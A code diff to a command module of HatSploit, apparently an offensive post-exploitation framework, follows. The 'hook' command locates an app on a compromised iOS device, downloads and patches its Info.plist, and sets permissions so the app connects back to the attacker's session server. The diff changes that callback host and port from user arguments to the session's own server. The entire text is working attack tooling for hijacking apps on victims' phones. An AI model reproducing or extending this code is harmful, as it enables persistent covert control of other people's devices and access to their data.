@@ -22,14 +22,15 @@ class HatSploitCommand(Command):
             'Authors': [
                 'Ivan Nikolskiy (enty8080) - command developer'
             ],
-            'Description': "Hook into other app (e.g. Contacts.app).",
-            'Usage': "hook <host> <port> <app_name>",
-            'MinArgs': 3
+            'Description': "Hook into other app (e.g. Contacts).",
+            'Usage': "hook <app>",
+            'MinArgs': 1
         }
 
         self.plist = Loot().specific_loot('Info.plist')
 
     def find_app(self, app_name):
+        app_name += '.app'
         containers = '/private/var/containers/Bundle/Application'
 
         result = self.session.send_command(
@@ -76,10 +77,10 @@ class HatSploitCommand(Command):
         return path
 
     def run(self, argc, argv):
-        path = self.find_app(argv[3])
+        path = self.find_app(argv[1])
 
         if not path:
-            self.print_error(f"Path for {argv[3]} not found!")
+            self.print_error(f"Path for {argv[1]} not found!")
             return
 
         if not self.session.download(path + '/Info.plist', self.plist):
@@ -88,7 +89,8 @@ class HatSploitCommand(Command):
 
         self.print_process("Patching Info.plist...")
 
-        hook = Hook(argv[1], argv[2])
+        hook = Hook(host=self.session.device.server[0],
+                    port=self.session.device.server[1])
         hook.patch_plist(self.plist)
 
         executable = hook.get_executable(self.plist)
@@ -140,4 +142,4 @@ class HatSploitCommand(Command):
             self.print_error(f"Failed to give permissions to mussel!")
             return
 
-        self.print_success(f"{argv[3]} patched successfully!")
+        self.print_success(f"{argv[1]} patched successfully!")
